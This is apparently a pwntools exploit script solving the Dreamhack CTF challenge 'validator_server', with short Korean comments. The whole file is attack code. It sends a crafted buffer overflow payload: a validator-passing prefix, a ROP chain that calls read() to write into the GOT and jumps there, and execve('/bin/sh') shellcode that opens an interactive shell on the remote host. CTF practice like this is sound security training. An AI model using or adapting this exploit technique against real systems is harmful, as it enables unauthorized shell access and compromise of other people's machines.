from pwn import *

context.log_level = 'debug'

p = remote('host3.dreamhack.games', 8276)
e = ELF('./validator_server')

shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

read_plt = e.plt['read']
read_got = e.got['read']
exit_got = e.got['exit']
pop_rdi = 0x4006f3
pop_rsi_r15 = 0x4006f1
pop_rdx = 0x40057b
ret = 0x40044e

# payload 0x88까지 채우고, return address를 잘 조작하자
payload = b'DREAMHACK!'
payload += b' '
# idx 11부터 127까지 문자값이 1씩 줄어들어야 한다.
list = []
for i in range(118, 0, -1) :
    list.append(i)
payload += bytearray(list)

payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(pop_rdx) + p64(0x150)
payload += p64(read_plt)
payload += p64(exit_got)

pause()
p.send(payload)

p.send(shellcode)

p.interactive()